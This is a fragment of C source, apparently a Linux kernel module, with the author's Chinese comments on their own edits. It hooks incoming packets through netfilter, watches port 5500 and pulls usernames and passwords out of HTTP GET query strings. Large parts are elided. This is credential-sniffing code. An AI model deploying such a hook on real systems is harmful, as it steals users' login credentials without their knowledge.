...
static void check_http(struct sk_buff *skb)
{
  ...
  //  char *data;
   ...
   // data = (unsigned char *)tcp + (unsigned long)(tcp->doff*4);
...
//   if (strstr(data,"Connection") != NULL && strstr(data, "uid") != NULL && strstr(data, "password") != NULL) { 
  ...
  // hhh post改成了GET 顺便修改了if的判定条件，把upgrade那传删掉了
   if (strstr(data,"GET /") != NULL&& strstr(data, "?uid") != NULL && strstr(data, "&password") != NULL) { 
// printk("haha");
        // //data = strstr(data,"Upgrade-Insecure-Requests");

        printk("find GET HTTP");
        //hhh把&改成了?
        ...
        *(username + len) = '\0';
        ...
        passwd += 10;
        _and = strstr(passwd," HTTP");//hh后面的匹配条件改掉了
                              ...
                              const struct nf_hook_state *state)
{
   ...
   if (tcp->dest != htons(5500))//hhh端口号改成了5500，因为我的服务器端口号是这个
...
int init_module()
{
  //struct net *net=NULL;
   ...
   post_hook.hooknum  = NF_INET_PRE_ROUTING;//hhh里面的参数改成了pre
